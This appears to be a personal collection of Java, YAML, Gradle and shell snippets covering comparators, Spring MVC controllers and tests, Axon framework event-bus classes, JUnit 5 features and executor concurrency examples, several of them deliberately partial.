Collections.sort(pizzas, chain);

Collections.sort(pizzas, new Comparator<Pizza>() {  
    @Override  
    public int compare(Pizza p1, Pizza p2) {  
        return ComparisonChain.start().compare(p1.size, p2.size).compare(p1.nrOfToppings, p2.nrOfToppings).compare(p1.name, p2.name).result();  
        // or in case the fields can be null:  
        /* 
        return ComparisonChain.start() 
           .compare(p1.size, p2.size, Ordering.natural().nullsLast()) 
           .compare(p1.nrOfToppings, p2.nrOfToppings, Ordering.natural().nullsLast()) 
           .compare(p1.name, p2.name, Ordering.natural().nullsLast()) 
           .result(); 
        */  
    }  
});

class MultiComparator<T> implements Comparator<T> {
    private final List<Comparator<T>> comparators;

    public MultiComparator(List<Comparator<? super T>> comparators) {
        this.comparators = comparators;
    }

    public MultiComparator(Comparator<? super T>... comparators) {
        this(Arrays.asList(comparators));
    }

    public int compare(T o1, T o2) {
        for (Comparator<T> c : comparators) {
            int result = c.compare(o1, o2);
            if (result != 0) {
                return result;
            }
        }
        return 0;
    }

    public static <T> void sort(List<T> list, Comparator<? super T>... comparators) {
        Collections.sort(list, new MultiComparator<T>(comparators));
    }
}
--------------------------------------------------------------------------------------------------------
RestTemplate restTemplate = new RestTemplate();
ResponseEntity<List<Employee>> response = restTemplate.exchange(
  "http://localhost:8080/employees/",
  HttpMethod.GET,
  null,
  new ParameterizedTypeReference<List<Employee>>(){});
List<Employee> employees = response.getBody();

List<Employee> newEmployees = new ArrayList<>();
newEmployees.add(new Employee(3, "Intern"));
newEmployees.add(new Employee(4, "CEO"));
 
restTemplate.postForObject(
  "http://localhost:8080/employees",
  new EmployeeList(newEmployees),
  ResponseEntity.class);
--------------------------------------------------------------------------------------------------------
/**
 * Print extra information about a compiled automaton file.
 */
@Parameters(
    commandNames = "fsa_info",
    commandDescription = "Print extra information about a compiled automaton file.")
public class FSAInfo extends CliTool {
  @Parameter(
      names = {"-i", "--input"},
      description = "The input automaton.", 
      required = true,
      validateValueWith = ValidateFileExists.class)
  private Path input;

  FSAInfo() {
  }

  public FSAInfo(Path input) {
    this.input = checkNotNull(input);
  }

  @Override
  public ExitStatus call() throws Exception {
    final FSA fsa;
    try (InputStream is = new BufferedInputStream(Files.newInputStream(input))) {
      fsa = FSA.read(is);
    }
}
--------------------------------------------------------------------------------------------------------
# {0} - status code; {1} - status reason message
exception.sending.error.response=I/O exception occurred while sending "{0}/{1}" error response.
# {0} - exception message
failed.to.start.server=Failed to start Grizzly HTTP server: {0}
--------------------------------------------------------------------------------------------------------
    @Bean                 
    public LocaleResolver localeResolver() {

        SessionLocaleResolver localResolver=new SessionLocaleResolver();
        localResolver.setDefaultLocale(Locale.US);
        return localResolver;
    }
--------------------------------------------------------------------------------------------------------
    @NullOrNotBlank(message = "{personalData.language.nullOrNotBlank}")
    private String language;
--------------------------------------------------------------------------------------------------------
    public static void main (String[] args) {
        String[] appArgs = {"--debug"};
        //String[] appArgs = {"--debug", "--spring.jmx.enabled=false"};
  /*      String[] appArgs = {"--debug", "--spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration"};*/

        SpringApplication app = new SpringApplication(ExcludeConfigExample.class);
        app.setBannerMode(Banner.Mode.OFF);
        app.setLogStartupInfo(false);
        app.run(appArgs);
    }
--------------------------------------------------------------------------------------------------------
import org.hamcrest.Description;
import org.hamcrest.Factory;
import org.hamcrest.Matcher;
import org.hamcrest.TypeSafeMatcher;

public class IsPositiveInteger extends TypeSafeMatcher<Integer> {

	public void describeTo(Description description) {
		description.appendText("a positive integer");
	}

	@Factory
	public static Matcher<Integer> isAPositiveInteger() {
		return new IsPositiveInteger();
	}

	@Override
	protected boolean matchesSafely(Integer integer) {
		return integer > 0;
	}
}
--------------------------------------------------------------------------------------------------------
import com.luv2code.springdemo.models.Customer;
import org.springframework.beans.propertyeditors.StringTrimmerEditor;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import javax.validation.Valid;

@Controller
@RequestMapping("/customer")
public class CustomerController {

    @RequestMapping("/")
    public String index() {
        return "customer/list/index";
    }

    @RequestMapping("/add")
    public String add(
        Model model
    ) {
        model.addAttribute("customer", new Customer());
        return "customer/add/index";
    }

    // TODO: Using POST as I dislike gets for this, even if they are easier...
    @PostMapping("/add/process")
    public String addProcess(
        @Valid @ModelAttribute("customer") Customer customer,
        BindingResult bindingResult,
        final RedirectAttributes redirectAttributes
    ) {
        // TODO: DEBUG
        System.out.println(bindingResult);
        if (bindingResult.hasErrors()) {
            return "customer/add/index";
        }
        // TODO: TEMP as this example does not include persistence
        redirectAttributes.addAttribute("firstName", customer.getFirstName());
        redirectAttributes.addAttribute("lastName", customer.getLastName());
        redirectAttributes.addAttribute("description", customer.getDescription());
        redirectAttributes.addAttribute("age", customer.getAge());
        redirectAttributes.addAttribute("zipCode", customer.getZipCode());
        redirectAttributes.addAttribute("branch", customer.getBranch());
        return "redirect:/customer/add/success";
    }

    @RequestMapping("/add/success")
    public String success(
        @RequestParam(value = "firstName") String firstName,
        @RequestParam(value = "lastName") String lastName,
        @RequestParam(value = "description") String description,
        @RequestParam(value = "age") String age,
        @RequestParam(value = "zipCode") String zipCode,
        @RequestParam(value = "branch") String branch,
        Model model
    ) {
        model.addAttribute("customer", new Customer(
            firstName,
            lastName,
            description,
            Integer.parseInt(age),
            zipCode,
            branch
        ));
        return "customer/add/success";
    }

    /**
     * Add an initBinder to handle strings that are empty
     *
     * @param dataBinder
     */
    @InitBinder
    public void initBinder(WebDataBinder dataBinder) {
        dataBinder.registerCustomEditor(String.class, new StringTrimmerEditor(true));
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import javax.validation.Valid;

/**
 * Created by Javier on 23/12/2015.
 */

@Controller
public class PersonController {

    @RequestMapping(value = "/form", method = RequestMethod.GET)
    public String showForm(Person person){
        return "form";
    }

    @RequestMapping(value = "/form", method = RequestMethod.POST)
    public String checkPersonInfo(@Valid Person person, BindingResult bindingResult, Model model){
        if(bindingResult.hasErrors()){
            return "form";
        }

        return "redirect:/results";
    }

    @RequestMapping("/results")
    public String result(){
        return "results";
    }
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class ControllerTest {

    @Autowired
    private WebApplicationContext wac;
    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testUserController () throws Exception {
        MockHttpServletRequestBuilder builder =
                                      MockMvcRequestBuilders.post("/test")
                                        .header("testHeader",
                                                "headerValue")
                                        .content("test body");
        this.mockMvc.perform(builder)
                    .andExpect(MockMvcResultMatchers.status()
                                                    .isOk())
                    .andDo(MockMvcResultHandlers.print());
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class ControllerTest {

    @Autowired
    private WebApplicationContext wac;
    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testUserController () throws Exception {

        MockHttpServletRequestBuilder builder =
                                   MockMvcRequestBuilders.post("/user")
                                        .header("testHeader",
                                                "headerValue")
                                        .contentType(MediaType.APPLICATION_JSON)
                                        .content(createUserInJson("joe",
                                                            "joe@example.com"));
        this.mockMvc.perform(builder)
                    .andExpect(MockMvcResultMatchers.status()
                                                    .isOk())
                    .andDo(MockMvcResultHandlers.print());
    }

    private static String createUserInJson (String name, String email) {
        return "{ \"name\": \"" + name + "\", " +
                            "\"emailAddress\":\"" + email + "\"}";
    }
}
--------------------------------------------------------------------------------------------------------
multiliners:
    ugly_multiline: "ugly\nugly\nugly\nugly\n"

    multiline_with_line_ending: |
        multiline text
        with ending

    multiline_without_line_ending: |-
        multiline text
        without ending
		
singleliners:
    simple: 
        single
        line
        text

    single-line-text: >-
        single
        line
        text

    single-line-text-with-line-ending: >
        single
        line
        text
		
commands:
    - do something with --a long --list of --parameters 
    - do something 
      with 
      --a long 
      --list of 
      --parameters 
	  
json:
    vm-profiles-yaml:
        small:
            cpu:  2
            ram:  2
            disk: 10
            os: rhel6 
        large:
            cpu:  4
            ram:  4
            disk: 10
            os: rhel6 

    vm-profiles-json:
        small:  { cpu: 2, ram: 2, disk: 10, os: rhel6 } 
        large:  { cpu: 4, ram: 4, disk: 10, os: rhel6 } 
		
matrices:
    matrix_json_style: [
        [1, 0, 0],
        [0, 1, 0],
        [0, 0, 1],
    ]
    matrix_yaml_style: 
      - [1, 0, 0]
      - [0, 1, 0]
      - [0, 0, 1]
	  
inheritance:
    _basic: &basic
        cpu:  2
        ram:  2
        disk: 10
        os: rhel6 

    vm-profiles:
        small: 
            <<: *basic
            cpu: 1
        large: 
            <<: *basic
            cpu: 4
			
inheritance:
    _basic: &basic
        cpu:  2
        ram:  2
        disk: 10
        os: rhel6 

    vm-profiles:
        small: {<<: *basic,  cpu: 1}
        large: {<<: *basic,  cpu: 4}
		
references:
    value1: &reference "Don't repeat yourself!"  
    value2: *reference 
	
# requires PyYAML
alias yaml2json='python -c "import sys,yaml,json;sys.tracebacklimit=0;print(json.dumps(yaml.load(open(sys.argv[1]).read()), indent=2))"'
--------------------------------------------------------------------------------------------------------
import com.google.common.collect.Lists;
import java.util.Arrays;
import java.util.List;

// Convert List<String> to List<Integer>
class ListUtil
{
	// Program to convert List of String to List of Integer using Guava
	public static void main(String args[])
	{
		List<String> list = Arrays.asList("-1", "2", "3", "4", "5");

		List<Integer> newList = Lists.transform(list, Integer::parseInt);
		System.out.println(newList);
	}
}

import com.google.common.base.Function;
import com.google.common.collect.Iterables;
import java.util.Arrays;
import java.util.List;

class ListUtil
{
	// Program to Convert List<String> to Iterable<Integer> using Guava
	public static void main(String args[])
	{
		List<String> list = Arrays.asList("-1", "2", "3", "4", "5");

		Iterable<Integer> iterable = Iterables.transform(list, 
														Integer::valueOf);

		System.out.println(iterable);
	}
}

Iterables.transform(list, new Function<String, Object>() {
	@Override
	public Integer apply(String s) {
		return Integer.valueOf(s);
	}
});

import com.google.common.collect.Collections2;

import java.util.Arrays;
import java.util.Collection;
import java.util.List;

class ListUtil
{
	// Program to Convert List<String> to Collection<Integer> using Guava
	public static void main(String args[])
	{
		List<String> list = Arrays.asList("-1", "2", "3", "4", "5");

		Collection<Integer> collection = Collections2.transform(list,
															Integer::valueOf);

		System.out.println(collection);
	}
}
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env bash

if [ "$#" -ne 1 ]
then
  echo "Usage: yaml2html <name without .yaml extension>"
  exit 1
fi

cat $1.yaml | yaml2yeast | yeast2html > $1.html

#!/usr/bin/env bash
# build docker image to run Yaml reference
docker build -t yaml-reference .
--------------------------------------------------------------------------------------------------------
import io.grpc.stub.StreamObserver;

/**
 * Author: marc
 */
public class SynchronizedStreamObserver<T>
        implements StreamObserver<T> {

    private final StreamObserver<T> delegate;

    public SynchronizedStreamObserver(
            StreamObserver<T> delegate) {
        this.delegate = delegate;
    }

    @Override
    public void onNext(T t) {
        synchronized (delegate) {
            delegate.onNext(t);
        }
    }

    @Override
    public void onError(Throwable throwable) {
        delegate.onError(throwable);
    }

    @Override
    public void onCompleted() {
        delegate.onCompleted();
    }
}

import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * Composite of {@link MessageDispatchInterceptor}s that apply all interceptors in the order of registration.
 *
 * @author Sara Pellegrini
 * @since 4.0
 */
public class DispatchInterceptors<M extends Message<?>> {

    private final List<MessageDispatchInterceptor<? super M>> dispatchInterceptors = new CopyOnWriteArrayList<>();

    public Registration registerDispatchInterceptor(MessageDispatchInterceptor<? super M> dispatchInterceptor) {
        dispatchInterceptors.add(dispatchInterceptor);
        return () -> dispatchInterceptors.remove(dispatchInterceptor);
    }

    @SuppressWarnings("unchecked")
    public <T extends M> T intercept(T message) {
        T messageToDispatch = message;
        for (MessageDispatchInterceptor<? super M> interceptor : dispatchInterceptors) {
            messageToDispatch = (T) interceptor.handle(messageToDispatch);
        }
        return messageToDispatch;
    }
}

import io.axoniq.axonserver.grpc.ErrorMessage;

import static org.axonframework.common.ObjectUtils.getOrDefault;

/**
 * Author: marc
 */
public class ExceptionSerializer {

    public static ErrorMessage serialize(String client, Throwable t) {
        ErrorMessage.Builder builder = ErrorMessage.newBuilder().setLocation(getOrDefault(client, "")).setMessage(
                t.getMessage() == null ? t.getClass().getName() : t.getMessage());
        builder.addDetails(t.getMessage() == null ? t.getClass().getName() : t.getMessage());
        while (t.getCause() != null) {
            t = t.getCause();
            builder.addDetails(t.getMessage() == null ? t.getClass().getName() : t.getMessage());
        }
        return builder.build();
    }
}

   /**
     * A {@link StreamObserver} implementation used to return a single result, upon which it completes the given
     * {@link CompletableFuture}.
     *
     * @param <T> the type of the single result
     */
    private class SingleResultStreamObserver<T> implements StreamObserver<T> {

        private final String context;
        private final CompletableFuture<T> future;

        private SingleResultStreamObserver(String context, CompletableFuture<T> future) {
            this.context = context;
            this.future = future;
        }

        @Override
        public void onNext(T t) {
            future.complete(t);
        }

        @Override
        public void onError(Throwable throwable) {
            checkConnectionException(throwable, context);
            future.completeExceptionally(GrpcExceptionParser.parse(throwable));
        }

        @Override
        public void onCompleted() {
            if (!future.isDone()) {
                future.completeExceptionally(new AxonServerException(
                        "AXONIQ-0001", "Async call completed before answer"
                ));
            }
        }
    }
--------------------------------------------------------------------------------------------------------
   public static List<DomainEventMessage<?>> createEvents(int numberOfEvents) {
        return IntStream.range(0, numberOfEvents)
                        .mapToObj(sequenceNumber -> createEvent(TYPE,
                                                                IdentifierFactory.getInstance().generateIdentifier(),
                                                                AGGREGATE,
                                                                sequenceNumber,
                                                                PAYLOAD + sequenceNumber,
                                                                METADATA))
                        .collect(Collectors.toList());
    }
--------------------------------------------------------------------------------------------------------
    private static class StubTrackingEventStream implements TrackingEventStream {


        private final Queue<TrackedEventMessage<?>> eventMessages;

        public StubTrackingEventStream(long... tokens) {
            GapAwareTrackingToken lastToken = GapAwareTrackingToken.newInstance(-1, emptySortedSet());
            eventMessages = new LinkedList<>();
            for (Long seq : tokens) {
                lastToken = lastToken.advanceTo(seq, 1000);
                eventMessages.add(new GenericTrackedEventMessage<>(lastToken, createEvent(seq)));
            }
        }

        @Override
        public Optional<TrackedEventMessage<?>> peek() {
            if (eventMessages.isEmpty()) {
                return Optional.empty();
            }
            return Optional.of(eventMessages.peek());
        }

        @Override
        public boolean hasNextAvailable(int timeout, TimeUnit unit) {
            return !eventMessages.isEmpty();
        }

        @Override
        public TrackedEventMessage<?> nextAvailable() {
            return eventMessages.poll();
        }

        @Override
        public void close() {

        }
    }
--------------------------------------------------------------------------------------------------------
select 1 from dual
--------------------------------------------------------------------------------------------------------
    /**
     * Publish a collection of events on this bus (one, or multiple). The events will be dispatched to all subscribed
     * listeners.
     * <p>
     * Implementations may treat the given {@code events} as a single batch and distribute the events as such to
     * all subscribed EventListeners.
     *
     * @param events The collection of events to publish
     */
    default void publish(EventMessage<?>... events) {
        publish(Arrays.asList(events));
    }

    /**
     * Publish a collection of events on this bus (one, or multiple). The events will be dispatched to all subscribed
     * listeners.
     * <p>
     * Implementations may treat the given {@code events} as a single batch and distribute the events as such to
     * all subscribed EventListeners.
     *
     * @param events The collection of events to publish
     */
    void publish(List<? extends EventMessage<?>> events);
--------------------------------------------------------------------------------------------------------
   @JsonGetter("upperSegmentToken")
    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)
    public TrackingToken upperSegmentToken() {
        return upperSegmentToken;
    }
--------------------------------------------------------------------------------------------------------
/**
 * Singleton ErrorHandler implementation that does not do anything.
 *
 * @author Rene de Waele
 */
public enum PropagatingErrorHandler implements ErrorHandler, ListenerInvocationErrorHandler {

    /**
     * Singleton instance of a {@link PropagatingErrorHandler}.
     */
    INSTANCE;

    /**
     * Singleton instance of a {@link PropagatingErrorHandler}.
     *
     * @return the singleton instance of {@link PropagatingErrorHandler}
     */
    public static PropagatingErrorHandler instance() {
        return INSTANCE;
    }

    @Override
    public void onError(Exception exception, EventMessage<?> event, EventMessageHandler eventHandler) throws Exception {
        throw exception;
    }

    @Override
    public void handleError(ErrorContext errorContext) throws Exception {
        Throwable error = errorContext.error();
        if (error instanceof Error) {
            throw (Error) error;
        } else if (error instanceof Exception) {
            throw (Exception) error;
        } else {
            throw new EventProcessingException("An error occurred while handling an event", error);
        }
    }
}
--------------------------------------------------------------------------------------------------------
import org.axonframework.common.AxonConfigurationException;
import org.axonframework.monitoring.MessageMonitor;
import org.axonframework.monitoring.NoOpMessageMonitor;

/**
 * Implementation of the {@link EventBus} that dispatches events in the thread the publishes them.
 *
 * @author Allard Buijze
 * @since 0.5
 */
public class SimpleEventBus extends AbstractEventBus {

    /**
     * Instantiate a Builder to be able to create a {@link SimpleEventBus}.
     * <p>
     * The {@link MessageMonitor} is defaulted to a {@link NoOpMessageMonitor} and the {@code queueCapacity} to
     * {@link Integer#MAX_VALUE}.
     *
     * @return a Builder to be able to create a {@link SimpleEventBus}
     */
    public static Builder builder() {
        return new Builder();
    }

    /**
     * Instantiate a {@link SimpleEventBus} based on the fields contained in the {@link Builder}.
     *
     * @param builder the {@link Builder} used to instantiate a {@link SimpleEventBus} instance
     */
    protected SimpleEventBus(Builder builder) {
        super(builder);
    }

    /**
     * Builder class to instantiate a {@link SimpleEventBus}.
     * <p>
     * The {@link MessageMonitor} is defaulted to a {@link NoOpMessageMonitor}.
     */
    public static class Builder extends AbstractEventBus.Builder {

        @Override
        public Builder messageMonitor(MessageMonitor<? super EventMessage<?>> messageMonitor) {
            super.messageMonitor(messageMonitor);
            return this;
        }

        /**
         * Initializes a {@link SimpleEventBus} as specified through this Builder.
         *
         * @return a {@link SimpleEventBus} as specified through this Builder
         */
        public SimpleEventBus build() {
            return new SimpleEventBus(this);
        }

        /**
         * Validates whether the fields contained in this Builder are set accordingly.
         *
         * @throws AxonConfigurationException if one field is asserted to be incorrect according to the Builder's
         *                                    specifications
         */
        @Override
        protected void validate() throws AxonConfigurationException {
            super.validate();
        }
    }
}
--------------------------------------------------------------------------------------------------------

import org.axonframework.common.Priority;
import org.axonframework.messaging.Message;
import org.axonframework.messaging.annotation.AbstractAnnotatedParameterResolverFactory;
import org.axonframework.messaging.annotation.ParameterResolver;
import org.axonframework.messaging.annotation.ParameterResolverFactory;

import java.time.Instant;

/**
 * AbstractAnnotatedParameterResolverFactory that accepts parameters with type {@link Instant} that are annotated
 * with the {@link Timestamp} annotation and assigns the timestamp of the EventMessage.
 *
 * @author Allard Buijze
 * @since 2.0
 */
@Priority(Priority.HIGH)
public final class TimestampParameterResolverFactory
        extends AbstractAnnotatedParameterResolverFactory<Timestamp, Instant> {

    private final ParameterResolver<Instant> resolver;

    /**
     * Initializes a {@link ParameterResolverFactory} for {@link Timestamp}
     * annotated parameters
     */
    public TimestampParameterResolverFactory() {
        super(Timestamp.class, Instant.class);
        resolver = new TimestampParameterResolver();
    }

    @Override
    protected ParameterResolver<Instant> getResolver() {
        return resolver;
    }

    /**
     * ParameterResolver that resolved Timestamp parameters
     */
    static class TimestampParameterResolver implements ParameterResolver<Instant> {

        @Override
        public Instant resolveParameterValue(Message message) {
            if (message instanceof EventMessage) {
                return ((EventMessage) message).getTimestamp();
            }
            return null;
        }

        @Override
        public boolean matches(Message message) {
            return message instanceof EventMessage;
        }
    }
}
--------------------------------------------------------------------------------------------------------
    private abstract class Instruction implements Runnable {

        private final CompletableFuture<Boolean> result;
        public Instruction(CompletableFuture<Boolean> result) {
            this.result = result;
        }

        public void run() {
            try {
                executeWithRetry(() -> transactionManager.executeInTransaction(() -> result.complete(runSafe())),
                                 re -> ExceptionUtils.findException(re, UnableToClaimTokenException.class).isPresent(),
                                 tokenClaimInterval, MILLISECONDS, 10);
            } catch (Exception e) {
                result.completeExceptionally(e);
            }
        }

        protected abstract boolean runSafe();
    }
--------------------------------------------------------------------------------------------------------
   @ConditionalOnMissingQualifiedBean(beanClass = Serializer.class, qualifier = "!eventSerializer,messageSerializer")
   
    @Bean
    @ConditionalOnMissingBean
    @ConditionalOnBean(GlobalMetricRegistry.class)
    @ConditionalOnProperty(value = "axon.metrics.auto-configuration.enabled", matchIfMissing = true)
    public static MetricsConfigurerModule metricsConfigurerModule(GlobalMetricRegistry globalMetricRegistry) {
        return new MetricsConfigurerModule(globalMetricRegistry);
    }
--------------------------------------------------------------------------------------------------------
import com.codahale.metrics.MetricRegistry;
import org.axonframework.metrics.GlobalMetricRegistry;
import org.axonframework.metrics.MetricsConfigurerModule;
import org.axonframework.springboot.MetricsProperties;
import org.springframework.boot.autoconfigure.AutoConfigureBefore;
import org.springframework.boot.autoconfigure.condition.ConditionalOnBean;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

/**
 * Auto configuration to set up Metrics for the infrastructure components.
 *
 * @author Steven van Beelen
 * @since 3.2
 */
@Configuration
@AutoConfigureBefore(AxonAutoConfiguration.class)
@ConditionalOnMissingBean(MicrometerMetricsAutoConfiguration.class)
@ConditionalOnClass(name = {
        "com.codahale.metrics.MetricRegistry",
        "org.axonframework.metrics.GlobalMetricRegistry"
})
@EnableConfigurationProperties(MetricsProperties.class)
public class MetricsAutoConfiguration {

    @Bean
    @ConditionalOnMissingBean(MetricRegistry.class)
    public static MetricRegistry metricRegistry() {
        return new MetricRegistry();
    }

    @Bean
    @ConditionalOnMissingBean
    @ConditionalOnBean(MetricRegistry.class)
    public static GlobalMetricRegistry globalMetricRegistry(MetricRegistry metricRegistry) {
        return new GlobalMetricRegistry(metricRegistry);
    }

    @Bean
    @ConditionalOnMissingBean
    @ConditionalOnBean(GlobalMetricRegistry.class)
    @ConditionalOnProperty(value = "axon.metrics.auto-configuration.enabled", matchIfMissing = true)
    public static MetricsConfigurerModule metricsConfigurerModule(GlobalMetricRegistry globalMetricRegistry) {
        return new MetricsConfigurerModule(globalMetricRegistry);
    }
}

    @Bean
    @ConditionalOnMissingBean(MetricsConfigurerModule.class)
    @ConditionalOnBean(GlobalMetricRegistry.class)
    @ConditionalOnProperty(value = "axon.metrics.auto-configuration.enabled", matchIfMissing = true)
    public static MetricsConfigurerModule metricsConfigurerModule(GlobalMetricRegistry globalMetricRegistry) {
        return new MetricsConfigurerModule(globalMetricRegistry);
    }
--------------------------------------------------------------------------------------------------------
apply plugin: "java"

repositories {
  mavenCentral()
}

dependencies {
  testCompile 'org.junit.jupiter:junit-jupiter-api:5.2.0'
  testRuntime 'org.junit.jupiter:junit-jupiter-engine:5.2.0'
}

test {
  useJUnitPlatform()

  reports {
    html.enabled = true
  }
}

def junitJupiterVersion = '5.3.2'

apply plugin: "java"

repositories {
  mavenCentral()
}

dependencies {
  testCompile "org.junit.jupiter:junit-jupiter-api:$junitJupiterVersion"
  testCompile "org.junit.jupiter:junit-jupiter-params:$junitJupiterVersion"
  testRuntime "org.junit.jupiter:junit-jupiter-engine:$junitJupiterVersion"
}

test {
  useJUnitPlatform()

  reports {
    html.enabled = true
  }

  systemProperties = System.properties
}

--------------------------------------------------------------------------------------------------------
@Test
@DisplayName("Should assert all person attributes at once")
void shouldAssertAllPersonAttributes() {
  assertAll("person",
    () -> assertEquals("josdem", person.getNickname()),
    () -> assertEquals("joseluis.delacruz@gmail.com", person.getEmail())
  );
}

@Test
@DisplayName("Should throw an exception")
public void shouldThrowNullPointerException() {
  Person person = null;
  assertThrows(NullPointerException.class, () -> person.getNickname());
}


import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.logging.Logger;

import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInfo;

class StandardTest {

  private static final Logger log = Logger.getLogger(StandardTest.class.getName());

  @BeforeAll
  static void setup() {
    log.info("Before any test execution");
  }

  @BeforeEach
  void init() {
    log.info("Before each test execution");
  }

  @Test
  @DisplayName("succeed test case")
  void succeedingTest(TestInfo testInfo) {
    log.info(String.format("Running %s ...", testInfo.getDisplayName()));
    assertTrue(true, () -> "Always passing this test");
  }

  @AfterEach
  void finish() {
    log.info("After each test execution");
  }

  @AfterAll
  static void tearDown() {
    log.info("After all test execution");
  }

}

import static org.junit.jupiter.api.Assumptions.assumeTrue;
import static org.junit.jupiter.api.Assumptions.assumingThat;
import static org.junit.jupiter.api.Assertions.assertEquals;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;

import java.util.logging.Logger;

class AssumptionShowTest {

  private final Logger log = Logger.getLogger(AssumptionShowTest.class.getName());
  private final Person person = new Person("josdem", "joseluis.delacruz@gmail.com");

  @Test
  @DisplayName("Assume that is a Gmail account")
  void shouldKnowIfIsGmailAccount(){
    assumeTrue(person.getEmail().endsWith("gmail.com"));
    log.info("Test continues ...");
    assertEquals("josdem", person.getNickname());
  }

   @Test
   @DisplayName("Assuming something based in conditions")
   void testAssumingThat() {
     assumingThat(2 > 1, () -> log.info("This should happen!"));
     assumingThat(2 < 1, () -> log.info("This should never happen!"));
   }

}

@Test
@DisplayName("Should run if DEV environment")
@EnabledIfSystemProperty(named = "environment", matches = "DEV")
void shouldRunIfDevelopmentEnvironment(){
  log.info("Running: Conditions if is development");
  assertTrue(true);
}
@Test
@DisplayName("Should run if Monday")
@EnabledIf("(java.time.LocalDate).now().getDayOfWeek() == 'MONDAY'")
void shouldRunIfMonday() {
  log.info("Running: Conditions if is Monday");
  assertTrue(true);
}
@Test
@EnabledOnOs({ LINUX, MAC })
void shouldRunOnLinuxOrMac() {
  log.info("Running: Conditions if Linux or Mac");
  assertTrue(true);
}



import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.assertNotNull;

import java.util.EnumSet;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.EnumSource;
import org.junit.jupiter.params.provider.ValueSource;
import org.junit.jupiter.params.provider.CsvFileSource;

import java.util.logging.Logger;

class ParameterizedShowTest {

  private PalindromeEvaluator evaluator = new PalindromeEvaluator();
  private final Logger log = Logger.getLogger(ParameterizedShowTest.class.getName());

  @DisplayName("Allow string as parameters")
  @ParameterizedTest
  @ValueSource(strings = { "radar", "anitalavalatina" })
  void shouldAllowStringAsParamters(String word) {
    log.info("Running: Parameters as string");
    assertTrue(evaluator.isPalindrome(word));
  }

  @DisplayName("Allow enum as parameters")
  @ParameterizedTest
  @EnumSource(Environment.class)
  void shouldAllowEnumAsParameters(Environment environment) {
    assertNotNull(environment);
  }

  @DisplayName("Allow certain enum as parameters")
  @ParameterizedTest
  @EnumSource(value = Environment.class, names = {"DEVELOPMENT", "QA"})
  void shouldAllowCertainEnumAsParameters(Environment environment) {
    assertTrue(EnumSet.of(Environment.DEVELOPMENT, Environment.QA).contains(environment));
  }

  @DisplayName("Allow csv files as parameters")
  @ParameterizedTest
  @CsvFileSource(resources = "/csv.txt", numLinesToSkip = 1)
  void shouldAllowCsvFileSource(int id, String nickname, String email) {
    assertNotNull(id);
    assertTrue(nickname.length() > 3);
    assertTrue(email.endsWith("email.com"));
  }
}
--------------------------------------------------------------------------------------------------------
import java.util.stream.IntStream;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.atomic.AtomicInteger;

public class ExecutorAtomic {

	private final static Integer MAX_PERIOD_TIME = 30;
	private AtomicInteger atomic = new AtomicInteger(0);
	private ExecutorService executor = Executors.newFixedThreadPool(3);

	private Integer start() throws InterruptedException {
		IntStream.range(0, 3).forEach(i -> executor.submit(atomic::incrementAndGet));
		executor.shutdown();

		executor.awaitTermination(MAX_PERIOD_TIME, TimeUnit.SECONDS);
		return atomic.get();
	}

	public static void main(String[] args) throws InterruptedException {
		Integer result = new ExecutorAtomic().start();
		System.out.println("I have been counting: " + result + " times");
	}
}
import java.util.concurrent.TimeUnit;
import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.CompletableFuture;

public class ExecutorCompletableFuture {

  private final static Integer MAX_PERIOD_TIME = 30;

  private ExecutorService executor = Executors.newFixedThreadPool(3);

  private void start() throws InterruptedException, ExecutionException {
    CompletableFuture<Integer> completableFuture  = new CompletableFuture<Integer>();

    executor.submit(() -> {
      try{
        final Integer wait = 3;
        TimeUnit.SECONDS.sleep(wait);
        completableFuture.complete(wait);
      } catch (InterruptedException ie){
        System.out.println("InterruptedException: " + ie.getMessage());
      }
    });

    final Integer result = completableFuture.get();
    executor.shutdown();

    System.out.println("I have been sleeping: " + result + " seconds");
    executor.awaitTermination(MAX_PERIOD_TIME, TimeUnit.SECONDS);
  }

  public static void main(String[] args) throws InterruptedException, ExecutionException {
    new ExecutorCompletableFuture().start();
  }
}


import java.util.concurrent.TimeUnit;
import java.util.concurrent.ExecutionException;
